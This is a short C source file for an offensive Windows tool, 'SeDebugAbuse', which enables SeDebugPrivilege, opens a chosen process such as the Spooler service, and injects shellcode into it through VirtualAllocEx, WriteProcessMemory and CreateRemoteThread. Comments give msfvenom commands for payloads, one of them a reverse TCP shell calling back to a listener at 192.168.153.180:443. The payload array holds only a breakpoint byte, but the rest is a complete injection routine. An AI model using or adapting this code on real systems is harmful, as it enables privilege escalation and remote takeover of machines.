#include <windows.h>
#include <stdio.h>

int main(int argc, char** argv)
{
	if (argc < 2) {
		printf("Usage: SeDebugAbuse.exe <pid>\n");
		exit(0);
	}
	
	// PID 4 is protected, rather use another service e.g. Spooler
	DWORD pid = atoi(argv[1]);

	// Example payloads: 
	// msfvenom -p windows/x64/exec CMD='cmd.exe' EXITFUNC=none -f csharp
	// msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.153.180 LPORT=443 -f c -v sc
	BYTE sc[] = { 0xcc };

	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0)){
		printf("[!] AdjustTokenPrivileges %d\n", GetLastError());
		return -1;
	}

	HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (proc == NULL) {
		printf("[!] Could not open remote process %p\n", proc);
		return -1;
	}
	LPVOID rBuf = VirtualAllocEx(proc, NULL, sizeof(sc), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (rBuf == NULL) {
		printf("[!] Could not allocate shellcode in remote process\n");
		return -1;
	}
	else {
		printf("[>] Allocated shellcode @ %p\n", rBuf);
	}
	if (!WriteProcessMemory(proc, rBuf, sc, sizeof(sc), NULL)) {
		printf("[-] WriteProcessMemory to %d failed\n", pid);
		return -1;
	}
	printf("[>] CreateRemoteThread - Enjoy your shell!\n");
	HANDLE rThread = CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)rBuf, NULL, 0, NULL);
	CloseHandle(proc);
}